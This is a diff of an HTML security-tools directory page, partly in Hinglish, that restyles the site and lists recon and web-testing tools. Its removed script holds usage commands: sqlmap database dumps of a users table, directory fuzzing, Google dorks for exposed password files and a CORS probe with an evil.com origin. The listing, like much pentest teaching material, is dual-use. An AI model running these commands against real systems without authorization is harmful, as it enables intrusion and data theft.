@@ -2,8 +2,8 @@
 <html lang="hi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>CyberSec Pro - Termux Edition</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberSec Pro - World's Premium Cybersecurity Tools Hub</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         :root {
@@ -29,181 +29,182 @@
             color: var(--text-primary);
             line-height: 1.6;
             min-height: 100vh;
-            -webkit-tap-highlight-color: transparent;
-            overflow-x: hidden;
         }
-        ::-webkit-scrollbar { width: 4px; }
-        ::-webkit-scrollbar-thumb { background: var(--accent-cyan); border-radius: 2px; }
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-thumb { background: var(--accent-cyan); border-radius: 4px; }
 
         .navbar {
             position: fixed; top: 0; left: 0; right: 0; z-index: 1000;
-            background: rgba(10,14,23,0.97); backdrop-filter: blur(15px);
+            background: rgba(10,14,23,0.95); backdrop-filter: blur(20px);
             border-bottom: 1px solid var(--border-color);
-            padding: 0 1rem; height: 60px;
+            padding: 0 2rem; height: 70px;
             display: flex; align-items: center; justify-content: space-between;
         }
         .navbar .logo {
-            display: flex; align-items: center; gap: 8px;
-            font-size: 1.2rem; font-weight: 800; text-decoration: none; color: var(--text-primary);
+            display: flex; align-items: center; gap: 12px;
+            font-size: 1.5rem; font-weight: 800; text-decoration: none; color: var(--text-primary);
         }
         .navbar .logo .logo-icon {
-            width: 32px; height: 32px;
+            width: 40px; height: 40px;
             background: linear-gradient(135deg, var(--accent-cyan), var(--accent-blue));
-            border-radius: 8px; display: flex; align-items: center; justify-content: center;
-            font-size: 1rem; font-weight: bold; color: #000;
+            border-radius: 10px; display: flex; align-items: center; justify-content: center;
+            font-size: 1.3rem; font-weight: bold; color: #000;
         }
         .navbar .logo span {
             background: linear-gradient(135deg, var(--accent-cyan), var(--accent-blue));
             -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
         }
         .nav-links {
-            display: none; position: fixed; top: 60px; left: 0; right: 0; bottom: 0;
-            background: rgba(10,14,23,0.99); flex-direction: column;
-            padding: 1rem; gap: 0.2rem; z-index: 999; overflow-y: auto;
+            display: flex; align-items: center; gap: 0.5rem; list-style: none;
         }
-        .nav-links.open { display: flex; }
         .nav-links a {
             color: var(--text-secondary); text-decoration: none;
-            padding: 0.8rem 1rem; border-radius: 10px; font-size: 0.95rem; font-weight: 500;
-            transition: all 0.3s ease; border-bottom: 1px solid rgba(255,255,255,0.03);
+            padding: 0.5rem 1rem; border-radius: 8px;
+            font-size: 0.9rem; font-weight: 500;
+            transition: all 0.3s ease; position: relative;
         }
         .nav-links a:hover, .nav-links a.active {
             color: var(--accent-cyan); background: rgba(0,240,255,0.08);
         }
         .hamburger {
-            display: flex; flex-direction: column; cursor: pointer;
-            gap: 4px; background: none; border: none; padding: 8px;
+            display: none; flex-direction: column; cursor: pointer;
+            gap: 5px; background: none; border: none; padding: 5px;
         }
         .hamburger span {
-            width: 22px; height: 2px; background: var(--text-primary);
+            width: 25px; height: 2px; background: var(--text-primary);
             border-radius: 2px; transition: 0.3s ease;
         }
-
-        .page { display: none; padding-top: 75px; min-height: 100vh; animation: fadeIn 0.3s ease; }
-        .page.active { display: block; }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
+        /* Mobile ke liye overlay */
+        .nav-overlay {
+            display: none;
+            position: fixed; top: 70px; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.5);
+            z-index: 998;
         }
+        .nav-overlay.open { display: block; }
 
-        .container { max-width: 100%; margin: 0 auto; padding: 0 0.8rem 2rem; }
+        .page { display: none; padding-top: 90px; min-height: 100vh; animation: fadeIn 0.3s ease; }
+        .page.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        .hero { text-align: center; padding: 1.5rem 0.5rem 1rem; position: relative; }
+        .container { max-width: 1280px; margin: 0 auto; padding: 0 2rem 3rem; }
+
+        .hero { text-align: center; padding: 3rem 1rem 2rem; position: relative; }
+        .hero::before {
+            content: ''; position: absolute; top: -50%; left: 50%;
+            transform: translateX(-50%);
+            width: 600px; height: 600px;
+            background: radial-gradient(circle, rgba(0,240,255,0.05), transparent 70%);
+            pointer-events: none;
+        }
         .hero .badge {
             display: inline-block; background: rgba(0,240,255,0.1);
             border: 1px solid rgba(0,240,255,0.3); color: var(--accent-cyan);
-            padding: 0.3rem 0.8rem; border-radius: 50px;
-            font-size: 0.7rem; font-weight: 600; margin-bottom: 1rem;
+            padding: 0.4rem 1.2rem; border-radius: 50px;
+            font-size: 0.85rem; font-weight: 600; margin-bottom: 1.5rem;
         }
         .hero h1 {
-            font-size: 1.6rem; font-weight: 800; margin-bottom: 0.5rem;
+            font-size: 3rem; font-weight: 800; margin-bottom: 1rem;
             background: linear-gradient(135deg, var(--text-primary), var(--accent-cyan));
             -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
         }
-        .hero p { font-size: 0.85rem; color: var(--text-secondary); padding: 0 0.5rem; margin-bottom: 1.2rem; }
-        .hero .stats { display: flex; justify-content: center; gap: 1.2rem; flex-wrap: wrap; }
+        .hero p { font-size: 1.15rem; color: var(--text-secondary); max-width: 700px; margin: 0 auto 2rem; }
+        .hero .stats { display: flex; justify-content: center; gap: 3rem; flex-wrap: wrap; }
         .hero .stat-item { text-align: center; }
-        .hero .stat-item .num { font-size: 1.3rem; font-weight: 800; color: var(--accent-cyan); }
-        .hero .stat-item .label { font-size: 0.7rem; color: var(--text-secondary); }
+        .hero .stat-item .num { font-size: 2rem; font-weight: 800; color: var(--accent-cyan); }
+        .hero .stat-item .label { font-size: 0.85rem; color: var(--text-secondary); }
 
-        .page-header { text-align: center; padding: 1rem 0.5rem 0.5rem; }
-        .page-header h1 { font-size: 1.3rem; font-weight: 800; margin-bottom: 0.3rem; }
-        .page-header p { color: var(--text-secondary); font-size: 0.8rem; padding: 0 0.5rem; }
+        .page-header { text-align: center; padding: 2rem 1rem 1.5rem; }
+        .page-header h1 { font-size: 2.2rem; font-weight: 800; margin-bottom: 0.5rem; }
+        .page-header p { color: var(--text-secondary); max-width: 600px; margin: 0 auto; font-size: 1.05rem; }
 
-        .category-cards {
-            display: grid; grid-template-columns: repeat(2, 1fr);
-            gap: 0.7rem; margin-top: 1rem;
-        }
-        .category-card {
-            background: var(--bg-card); border: 1px solid var(--border-color);
-            border-radius: 12px; padding: 1rem; text-align: center;
-            cursor: pointer; transition: all 0.3s ease; text-decoration: none; color: var(--text-primary);
-        }
-        .category-card:active { transform: scale(0.97); border-color: var(--accent-cyan); }
-        .category-card .cat-icon { font-size: 1.5rem; margin-bottom: 0.4rem; }
-        .category-card h3 { font-size: 0.85rem; font-weight: 700; }
-        .category-card p { color: var(--text-secondary); font-size: 0.7rem; margin-top: 0.2rem; }
-        .category-card .count {
-            display: inline-block; margin-top: 0.4rem; font-size: 0.65rem;
-            background: rgba(0,240,255,0.1); color: var(--accent-cyan); padding: 0.15rem 0.5rem; border-radius: 50px;
-        }
-
-        .tools-grid { display: flex; flex-direction: column; gap: 0.8rem; margin-top: 1rem; }
+        .tools-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 1.5rem; margin-top: 2rem; }
         .tool-card {
             background: var(--bg-card); border: 1px solid var(--border-color);
-            border-radius: 12px; padding: 1rem; transition: all 0.3s ease;
+            border-radius: 16px; padding: 1.5rem; transition: all 0.3s ease; position: relative; overflow: hidden;
         }
-        .tool-card:active { border-color: rgba(0,240,255,0.3); background: var(--bg-card-hover); }
-        .tool-card h3 { font-size: 1rem; font-weight: 700; margin-bottom: 0.2rem; }
-        .tool-card .tool-cat {
-            font-size: 0.65rem; color: var(--accent-cyan); background: rgba(0,240,255,0.1);
-            display: inline-block; padding: 0.15rem 0.5rem; border-radius: 50px; margin-bottom: 0.4rem; font-weight: 600;
+        .tool-card::before {
+            content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px;
+            background: linear-gradient(90deg, var(--accent-cyan), var(--accent-blue));
+            opacity: 0; transition: opacity 0.3s ease;
         }
-        .tool-card p { color: var(--text-secondary); font-size: 0.8rem; margin-bottom: 0.6rem; }
-        .tool-card .tool-use {
-            background: rgba(0,0,0,0.4); border-radius: 8px; padding: 0.6rem;
-            font-size: 0.72rem; color: var(--accent-green); border-left: 2px solid var(--accent-cyan);
-            font-family: 'Consolas', monospace; word-break: break-all; overflow-x: auto;
-        }
-        .tool-card .tool-tag {
-            display: inline-block; font-size: 0.6rem; padding: 0.12rem 0.4rem;
-            border-radius: 4px; margin-right: 0.2rem; margin-top: 0.3rem; font-weight: 600;
-        }
+        .tool-card:hover::before { opacity: 1; }
+        .tool-card:hover { border-color: rgba(0,240,255,0.3); transform: translateY(-4px); box-shadow: 0 12px 40px rgba(0,0,0,0.4); background: var(--bg-card-hover); }
+        .tool-card h3 { font-size: 1.15rem; font-weight: 700; margin-bottom: 0.4rem; }
+        .tool-card .tool-cat { font-size: 0.75rem; color: var(--accent-cyan); background: rgba(0,240,255,0.1); display: inline-block; padding: 0.2rem 0.7rem; border-radius: 50px; margin-bottom: 0.7rem; font-weight: 600; }
+        .tool-card p { color: var(--text-secondary); font-size: 0.92rem; margin-bottom: 1rem; }
+        .tool-card .tool-use { background: rgba(0,0,0,0.3); border-radius: 8px; padding: 0.8rem; font-size: 0.82rem; color: var(--text-secondary); border-left: 2px solid var(--accent-cyan); font-family: 'Consolas', monospace; overflow-x: auto; }
+        .tool-card .tool-tag { display: inline-block; font-size: 0.7rem; padding: 0.15rem 0.5rem; border-radius: 4px; margin-right: 0.3rem; margin-top: 0.5rem; font-weight: 600; }
         .tool-card .tool-tag.free { background: rgba(16,185,129,0.15); color: var(--accent-green); }
         .tool-card .tool-tag.paid { background: rgba(245,158,11,0.15); color: var(--accent-orange); }
         .tool-card .tool-tag.best { background: rgba(0,240,255,0.15); color: var(--accent-cyan); }
 
-        .search-box { margin: 0.5rem 0 1rem; position: relative; }
-        .search-box input {
-            width: 100%; padding: 0.7rem 1rem 0.7rem 2.5rem;
-            background: var(--bg-card); border: 1px solid var(--border-color);
-            border-radius: 10px; color: var(--text-primary);
-            font-size: 0.85rem; font-family: var(--font-main);
-            outline: none;
-        }
-        .search-box input:focus { border-color: var(--accent-cyan); }
-        .search-box .search-icon {
-            position: absolute; left: 0.8rem; top: 50%;
-            transform: translateY(-50%); color: var(--text-secondary); font-size: 0.9rem;
-        }
+        .search-box { max-width: 500px; margin: 0 auto 2rem; position: relative; }
+        .search-box input { width: 100%; padding: 0.9rem 1.2rem 0.9rem 3rem; background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; color: var(--text-primary); font-size: 0.95rem; font-family: var(--font-main); transition: all 0.3s ease; outline: none; }
+        .search-box input:focus { border-color: var(--accent-cyan); box-shadow: 0 0 20px rgba(0,240,255,0.1); }
+        .search-box .search-icon { position: absolute; left: 1rem; top: 50%; transform: translateY(-50%); color: var(--text-secondary); }
 
-        .tips-section { margin-top: 1.5rem; }
-        .tips-section h2 { font-size: 1.2rem; font-weight: 700; margin-bottom: 0.8rem; text-align: center; }
-        .tips-grid { display: flex; flex-direction: column; gap: 0.7rem; }
-        .tip-card {
-            background: var(--bg-card); border: 1px solid var(--border-color);
-            border-radius: 10px; padding: 0.8rem; transition: all 0.3s ease;
-        }
-        .tip-card .tip-num {
-            width: 28px; height: 28px; border-radius: 50%;
-            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-blue));
-            display: flex; align-items: center; justify-content: center;
-            font-weight: 800; font-size: 0.75rem; color: #000; margin-bottom: 0.4rem;
-        }
-        .tip-card h3 { font-size: 0.9rem; margin-bottom: 0.3rem; }
-        .tip-card p { color: var(--text-secondary); font-size: 0.78rem; }
+        .category-cards { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 1.2rem; margin-top: 2rem; }
+        .category-card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 14px; padding: 1.5rem; text-align: center; cursor: pointer; transition: all 0.3s ease; text-decoration: none; color: var(--text-primary); }
+        .category-card:hover { border-color: var(--accent-cyan); transform: translateY(-4px); box-shadow: 0 0 20px rgba(0,240,255,0.3); }
+        .category-card .cat-icon { font-size: 2.2rem; margin-bottom: 0.8rem; }
+        .category-card h3 { font-size: 1.05rem; font-weight: 700; }
+        .category-card p { color: var(--text-secondary); font-size: 0.85rem; margin-top: 0.3rem; }
+        .category-card .count { display: inline-block; margin-top: 0.6rem; font-size: 0.75rem; background: rgba(0,240,255,0.1); color: var(--accent-cyan); padding: 0.2rem 0.8rem; border-radius: 50px; }
 
-        .footer { text-align: center; padding: 1.5rem 1rem; margin-top: 2rem; color: var(--text-secondary); font-size: 0.75rem; }
-        .footer .footer-links { display: flex; justify-content: center; gap: 0.8rem; margin-bottom: 0.5rem; flex-wrap: wrap; }
-        .footer .footer-links a { color: var(--text-secondary); text-decoration: none; font-size: 0.75rem; }
+        .tips-section { margin-top: 3rem; }
+        .tips-section h2 { font-size: 1.8rem; font-weight: 700; margin-bottom: 1.5rem; text-align: center; }
+        .tips-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 1.5rem; }
+        .tip-card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 14px; padding: 1.5rem; transition: all 0.3s ease; }
+        .tip-card:hover { border-color: rgba(0,240,255,0.3); transform: translateY(-2px); }
+        .tip-card .tip-num { width: 36px; height: 36px; border-radius: 50%; background: linear-gradient(135deg, var(--accent-cyan), var(--accent-blue)); display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 0.9rem; color: #000; margin-bottom: 0.8rem; }
+        .tip-card h3 { font-size: 1.05rem; margin-bottom: 0.5rem; }
+        .tip-card p { color: var(--text-secondary); font-size: 0.9rem; }
+
+        .footer { text-align: center; padding: 2.5rem 2rem; border-top: 1px solid var(--border-color); margin-top: 3rem; color: var(--text-secondary); font-size: 0.85rem; }
+        .footer .footer-links { display: flex; justify-content: center; gap: 1.5rem; margin-bottom: 1rem; flex-wrap: wrap; }
+        .footer .footer-links a { color: var(--text-secondary); text-decoration: none; }
         .footer .footer-links a:hover { color: var(--accent-cyan); }
 
-        .back-btn {
-            display: block; text-align: center; margin: 1rem 0; padding: 0.6rem;
-            background: rgba(0,240,255,0.08); border-radius: 10px;
-            color: var(--accent-cyan); text-decoration: none; font-size: 0.85rem; font-weight: 600;
+        @media (max-width: 768px) {
+            .navbar { padding: 0 1rem; height: 60px; }
+            .navbar .logo { font-size: 1.1rem; }
+            .navbar .logo .logo-icon { width: 32px; height: 32px; font-size: 1rem; }
+            .hamburger { display: flex; }
+            .nav-links {
+                display: none;
+                position: fixed; top: 60px; left: 0; right: 0;
+                background: rgba(10,14,23,0.99);
+                flex-direction: column; padding: 0.5rem 1rem 1rem;
+                border-bottom: 1px solid var(--border-color);
+                z-index: 999;
+                max-height: 85vh;
+                overflow-y: auto;
+            }
+            .nav-links.open { display: flex; }
+            .nav-links a {
+                width: 100%; text-align: left; padding: 0.7rem 0.8rem;
+                border-bottom: 1px solid rgba(255,255,255,0.05);
+                font-size: 0.9rem;
+            }
+            .nav-links a:last-child { border-bottom: none; }
+            .hero h1 { font-size: 1.8rem; }
+            .hero .stats { gap: 1.5rem; }
+            .hero .stat-item .num { font-size: 1.5rem; }
+            .container { padding: 0 1rem 2rem; }
+            .tools-grid { grid-template-columns: 1fr; }
+            .page-header h1 { font-size: 1.6rem; }
+            .category-cards { grid-template-columns: repeat(2, 1fr); gap: 0.8rem; }
+            .category-card { padding: 1rem; }
+            .category-card .cat-icon { font-size: 1.5rem; }
+            .category-card h3 { font-size: 0.85rem; }
+            .category-card p { font-size: 0.7rem; }
+            .tips-grid { grid-template-columns: 1fr; }
         }
-        .cmd-copy {
-            display: inline-block; margin-top: 0.3rem; padding: 0.2rem 0.6rem;
-            background: rgba(0,240,255,0.1); border-radius: 4px;
-            color: var(--accent-cyan); font-size: 0.65rem; border: none; cursor: pointer;
-        }
-
-        .termux-badge {
-            display: inline-block; background: rgba(16,185,129,0.15);
-            border: 1px solid rgba(16,185,129,0.3); color: var(--accent-green);
-            padding: 0.2rem 0.6rem; border-radius: 50px;
-            font-size: 0.6rem; font-weight: 600; margin-left: 0.3rem;
+        @media (max-width: 480px) {
+            .category-cards { grid-template-columns: 1fr; }
+            .hero h1 { font-size: 1.5rem; }
+            .page-header h1 { font-size: 1.3rem; }
         }
     </style>
 </head>
@@ -214,105 +215,113 @@
         <div class="logo-icon">&#9760;</div>
         <span>CyberSec Pro</span>
     </a>
-    <button class="hamburger" onclick="toggleMenu()" aria-label="Menu">
-        <span></span><span></span><span></span>
+    <!-- HAMBURGER RIGHT CORNER -->
+    <button class="hamburger" id="hamburgerBtn" onclick="toggleMenu()" aria-label="Menu">
+        <span></span>
+        <span></span>
+        <span></span>
     </button>
-    <div class="nav-links" id="navLinks">
-        <a href="#" class="active" data-page="home" onclick="showPage('home')">&#127968; Home</a>
-        <a href="#" data-page="recon" onclick="showPage('recon')">&#128270; Recon & OSINT</a>
-        <a href="#" data-page="web" onclick="showPage('web')">&#127760; Web Security</a>
-        <a href="#" data-page="exploit" onclick="showPage('exploit')">&#9889; Exploitation</a>
-        <a href="#" data-page="password" onclick="showPage('password')">&#128273; Password</a>
-        <a href="#" data-page="network" onclick="showPage('network')">&#127937; Network</a>
-        <a href="#" data-page="forensic" onclick="showPage('forensic')">&#128187; Forensics</a>
-        <a href="#" data-page="tips" onclick="showPage('tips')">&#128161; Pro Tips</a>
-        <a href="#" data-page="termux" onclick="showPage('termux')">&#128241; Termux Setup</a>
-    </div>
+    <ul class="nav-links" id="navLinks">
+        <li><a href="#" class="active" data-page="home" onclick="showPage('home')">&#127968; Home</a></li>
+        <li><a href="#" data-page="recon" onclick="showPage('recon')">&#128270; Recon & OSINT</a></li>
+        <li><a href="#" data-page="web" onclick="showPage('web')">&#127760; Web Security</a></li>
+        <li><a href="#" data-page="exploit" onclick="showPage('exploit')">&#9889; Exploitation</a></li>
+        <li><a href="#" data-page="password" onclick="showPage('password')">&#128273; Password</a></li>
+        <li><a href="#" data-page="network" onclick="showPage('network')">&#127937; Network</a></li>
+        <li><a href="#" data-page="forensic" onclick="showPage('forensic')">&#128187; Forensics</a></li>
+        <li><a href="#" data-page="tips" onclick="showPage('tips')">&#128161; Pro Tips</a></li>
+    </ul>
 </nav>
 
 <div class="page active" id="page-home">
     <div class="container">
         <div class="hero">
-            <div class="badge">&#9889; Termux & Mobile Optimized</div>
-            <h1>CyberSec Pro ToolKit</h1>
-            <p>100+ Cybersecurity Tools — Termux commands ke saath. Android mobile aur PC dono ke liye working. Ethical hacking aur penetration testing ke liye best tools.</p>
+            <div class="badge">&#9889; World's Premium Cybersecurity Tools Hub</div>
+            <h1>CyberSec Pro Toolkit</h1>
+            <p>100+ Best-in-Class Cybersecurity Tools — Reconnaissance to Forensics. Every tool with usage guide, commands, and professional tips. Built for ethical hackers, pentesters, and security professionals.</p>
             <div class="stats">
-                <div class="stat-item"><div class="num">100+</div><div class="label">Tools</div></div>
+                <div class="stat-item"><div class="num">100+</div><div class="label">Security Tools</div></div>
                 <div class="stat-item"><div class="num">8</div><div class="label">Categories</div></div>
-                <div class="stat-item"><div class="num">Termux</div><div class="label">Ready</div></div>
+                <div class="stat-item"><div class="num">100%</div><div class="label">Free Resources</div></div>
             </div>
         </div>
 
-        <h2 style="text-align:center;font-size:1.1rem;font-weight:700;margin:1rem 0 0.5rem;">&#128073; Tool Categories</h2>
+        <h2 style="text-align:center;font-size:1.6rem;font-weight:700;margin:2rem 0 0.5rem;">Explore Tool Categories</h2>
+        <p style="text-align:center;color:var(--text-secondary);margin-bottom:1.5rem;">Click any category to explore detailed tools</p>
 
         <div class="category-cards">
             <a class="category-card" onclick="showPage('recon')">
                 <div class="cat-icon">&#128270;</div>
-                <h3>Recon & OSINT</h3>
-                <p>Information gathering</p>
-                <span class="count">15 Tools</span>
+                <h3>Reconnaissance & OSINT</h3>
+                <p>Information gathering, subdomain discovery, email enumeration</p>
+                <span class="count">15+ Tools</span>
             </a>
             <a class="category-card" onclick="showPage('web')">
                 <div class="cat-icon">&#127760;</div>
-                <h3>Web Security</h3>
-                <p>Scanning & exploitation</p>
-                <span class="count">16 Tools</span>
+                <h3>Web Application Security</h3>
+                <p>Web scanning, SQL injection, XSS, API testing</p>
+                <span class="count">18+ Tools</span>
             </a>
             <a class="category-card" onclick="showPage('exploit')">
                 <div class="cat-icon">&#9889;</div>
-                <h3>Exploitation</h3>
-                <p>Payloads & C2</p>
-                <span class="count">12 Tools</span>
+                <h3>Exploitation Frameworks</h3>
+                <p>Metasploit, payloads, browser exploitation, C2</p>
+                <span class="count">12+ Tools</span>
             </a>
             <a class="category-card" onclick="showPage('password')">
                 <div class="cat-icon">&#128273;</div>
-                <h3>Password</h3>
-                <p>Cracking & recovery</p>
-                <span class="count">13 Tools</span>
+                <h3>Password & Cracking</h3>
+                <p>Password recovery, hash cracking, brute force</p>
+                <span class="count">14+ Tools</span>
             </a>
             <a class="category-card" onclick="showPage('network')">
                 <div class="cat-icon">&#127937;</div>
-                <h3>Network</h3>
-                <p>Sniffing & scanning</p>
-                <span class="count">12 Tools</span>
+                <h3>Network & Wireless</h3>
+                <p>Packet analysis, Wi-Fi hacking, network scanning</p>
+                <span class="count">16+ Tools</span>
             </a>
             <a class="category-card" onclick="showPage('forensic')">
                 <div class="cat-icon">&#128187;</div>
-                <h3>Forensics</h3>
-                <p>Analysis & recovery</p>
-                <span class="count">10 Tools</span>
+                <h3>Forensics & Analysis</h3>
+                <p>Disk forensics, memory analysis, log analysis</p>
+                <span class="count">12+ Tools</span>
             </a>
             <a class="category-card" onclick="showPage('tips')">
                 <div class="cat-icon">&#128161;</div>
-                <h3>Pro Tips</h3>
-                <p>30 expert tips</p>
-                <span class="count">Tips</span>
+                <h3>Professional Tips</h3>
+                <p>Expert methodology, best practices, career advice</p>
+                <span class="count">30+ Tips</span>
             </a>
-            <a class="category-card" onclick="showPage('termux')" style="border-color:rgba(16,185,129,0.3);">
-                <div class="cat-icon">&#128241;</div>
-                <h3>Termux Setup</h3>
-                <p>Installation guide</p>
-                <span class="count">Setup</span>
+            <a class="category-card" onclick="showPage('home')" style="border-color:rgba(0,240,255,0.3);">
+                <div class="cat-icon">&#128640;</div>
+                <h3>All Tools Combined</h3>
+                <p>Complete master list with search & filter</p>
+                <span class="count">100+ Total</span>
             </a>
         </div>
 
         <div class="tips-section">
-            <h2>&#128161; Quick Tips</h2>
+            <h2>&#128161; Quick Professional Tips</h2>
             <div class="tips-grid">
                 <div class="tip-card">
                     <div class="tip-num">1</div>
                     <h3>Always Start with Recon</h3>
-                    <p>80% of successful pentests depend on good recon. Spend most time gathering information first.</p>
+                    <p>80% of successful pentests depend on good recon. Spend 60% of your time on information gathering before running any exploit.</p>
                 </div>
                 <div class="tip-card">
                     <div class="tip-num">2</div>
-                    <h3>Use Termux Responsibly</h3>
-                    <p>Only test systems you own or have explicit written permission to test. Stay legal and ethical.</p>
+                    <h3>Document Everything</h3>
+                    <p>Maintain detailed notes of every command, output, and finding. Use tools like CherryTree or KeepNote for organized reporting.</p>
                 </div>
                 <div class="tip-card">
                     <div class="tip-num">3</div>
-                    <h3>Keep Termux Updated</h3>
-                    <p>Run pkg update && pkg upgrade regularly for latest tools and security patches.</p>
+                    <h3>Master the CLI</h3>
+                    <p>GUI tools are slower. Learn command-line versions of tools — they're faster, scriptable, and work over SSH.</p>
+                </div>
+                <div class="tip-card">
+                    <div class="tip-num">4</div>
+                    <h3>Stay Legal & Ethical</h3>
+                    <p>Always have written authorization. Use these tools only on systems you own or have explicit permission to test.</p>
                 </div>
             </div>
         </div>
@@ -324,13 +333,11 @@
                 <a href="#" onclick="showPage('web')">Web</a>
                 <a href="#" onclick="showPage('exploit')">Exploit</a>
                 <a href="#" onclick="showPage('password')">Password</a>
-                <a href="#" onclick="showPage('network')">Network</a>
-                <a href="#" onclick="showPage('forensic')">Forensics</a>
+                <a href="#" onclick="showPage('network')">Net</a>
+                <a href="#" onclick="showPage('forensic')">Forensic</a>
                 <a href="#" onclick="showPage('tips')">Tips</a>
-                <a href="#" onclick="showPage('termux')">Termux</a>
             </div>
-            <p>&copy; 2026 <strong>CyberSec Pro</strong> — Termux Edition</p>
-            <p>&#9888; Use responsibly. Only test authorized systems.</p>
+            <p>&copy; 2026 <strong>CyberSec Pro</strong> &mdash; Premium Cybersecurity Tools Hub.</p>
         </div>
     </div>
 </div>
@@ -339,128 +346,130 @@
 
 <script>
 const toolsData = {
-    recon: {
-        title: "Reconnaissance & OSINT Tools",
-        subtitle: "Information gathering, subdomain discovery, email enumeration - Termux compatible",
-        tools: [
-            { name: "Nmap", cat: "Network Scanner", desc: "Network discovery aur port scanning ke liye number 1 tool. Host discovery, service detection, OS fingerprinting.", use: "nmap -sV -sC -O -A target.com", install: "pkg install nmap", tags: ["free","best"] },
-            { name: "Whois", cat: "Domain Intelligence", desc: "Domain registration details nikalne ke liye - registrar, creation date, name servers.", use: "whois target.com", install: "pkg install whois", tags: ["free"] },
-            { name: "DNS Lookup", cat: "DNS Enumeration", desc: "DNS records check karne ke liye - A, MX, NS, TXT records.", use: "nslookup target.com\ndig target.com ANY", install: "pkg install dnsutils", tags: ["free"] },
-            { name: "theHarvester", cat: "Email & Domain OSINT", desc: "Emails, subdomains, IPs gather karta hai public sources se.", use: "theharvester -d target.com -b google", install: "pkg install theharvester", tags: ["free"] },
-            { name: "WhatWeb", cat: "Website Fingerprinting", desc: "Website ki technology stack identify karta hai - CMS, frameworks, libraries.", use: "whatweb target.com", install: "pkg install whatweb", tags: ["free"] },
-            { name: "WafW00f", cat: "WAF Detection", desc: "Website ke aage WAF (Web Application Firewall) hai ya nahi detect karta hai.", use: "wafw00f target.com", install: "pip install wafw00f", tags: ["free"] },
-            { name: "Subfinder", cat: "Subdomain Discovery", desc: "Fast subdomain enumeration tool jo multiple sources use karta hai.", use: "subfinder -d target.com", install: "pkg install subfinder", tags: ["free","best"] },
-            { name: "Httpx", cat: "HTTP Probe", desc: "Subdomains me se live websites find karta hai.", use: "subfinder -d target.com | httpx", install: "pkg install httpx", tags: ["free"] },
-            { name: "Google Dorking", cat: "Search Engine OSINT", desc: "Google search operators se sensitive data find karna.", use: 'site:target.com filetype:pdf\ninurl:admin intitle:login\nfiletype:sql password', install: "Manual search", tags: ["free","best"] },
-            { name: "PhoneInfoga", cat: "Phone OSINT", desc: "Phone number se carrier, location aur reputation check.", use: "phoneinfoga scan -n +919876543210", install: "pkg install phoneinfoga", tags: ["free"] }
-        ]
-    },
-    web: {
-        title: "Web Application Security Tools",
-        subtitle: "Web scanning, SQL injection, XSS, API testing - Termux optimized commands",
-        tools: [
-            { name: "SQLMap", cat: "SQL Injection", desc: "Automated SQL injection tool. Databases, tables, data extract karta hai.", use: "sqlmap -u 'http://target.com/page?id=1' --dbs\nsqlmap -u 'http://target.com/page?id=1' -D dbname --tables\nsqlmap -u 'http://target.com/page?id=1' -D dbname -T users --dump", install: "pkg install sqlmap", tags: ["free","best"] },
-            { name: "Nikto", cat: "Web Server Scanner", desc: "Web server scan karta hai 6700+ dangerous files aur vulnerabilities ke liye.", use: "nikto -h target.com -ssl", install: "pkg install nikto", tags: ["free"] },
-            { name: "Gobuster", cat: "Directory Busting", desc: "Hidden directories aur files discover karta hai brute-force se.", use: "gobuster dir -u http://target.com -w /data/data/com.termux/files/usr/share/wordlists/dirb/common.txt", install: "pkg install gobuster", tags: ["free","best"] },
-            { name: "Dirsearch", cat: "Directory Scanner", desc: "Advanced directory brute-forcing tool.", use: "dirsearch -u target.com -e php,html,txt", install: "pip install dirsearch", tags: ["free"] },
-            { name: "WPScan", cat: "WordPress Scanner", desc: "WordPress vulnerabilities, plugins, themes, users enumerate karta hai.", use: "wpscan --url target.com --enumerate p,t,u", install: "pkg install wpscan", tags: ["free","best"] },
-            { name: "XSStrike", cat: "XSS Scanner", desc: "Advanced XSS scanner with context analysis aur WAF bypass.", use: "xsstrike -u 'http://target.com/search?q=test' --crawl", install: "pip install xsstrike", tags: ["free"] },
-            { name: "FFUF", cat: "Fast Fuzzer", desc: "Fast web fuzzer - directories, parameters, vhosts sab ke liye.", use: "ffuf -u http://target.com/FUZZ -w wordlist.txt\nffuf -u http://target.com -H 'Host: FUZZ.target.com' -w subdomains.txt", install: "pkg install ffuf", tags: ["free","best"] },
-            { name: "Joomscan", cat: "Joomla Scanner", desc: "Joomla CMS vulnerability scanner.", use: "joomscan -u target.com", install: "pkg install joomscan", tags: ["free"] },
-            { name: "WFuzz", cat: "Web Fuzzer", desc: "Parameters, directories, content injection test karne ke liye.", use: "wfuzz -c -z file,wordlist.txt --hc 404 http://target.com/FUZZ", install: "pkg install wfuzz", tags: ["free"] },
-            { name: "CORS Scanner", cat: "CORS Tester", desc: "CORS misconfiguration test karta hai via curl.", use: 'curl -H "Origin: https://evil.com" -I http://target.com/api', install: "curl (pre-installed)", tags: ["free"] }
-        ]
-    },
-    exploit: {
-        title: "Exploitation & Payloads",
-        subtitle: "Reverse shells, payload generation, C2 frameworks - Termux compatible",
-        tools: [
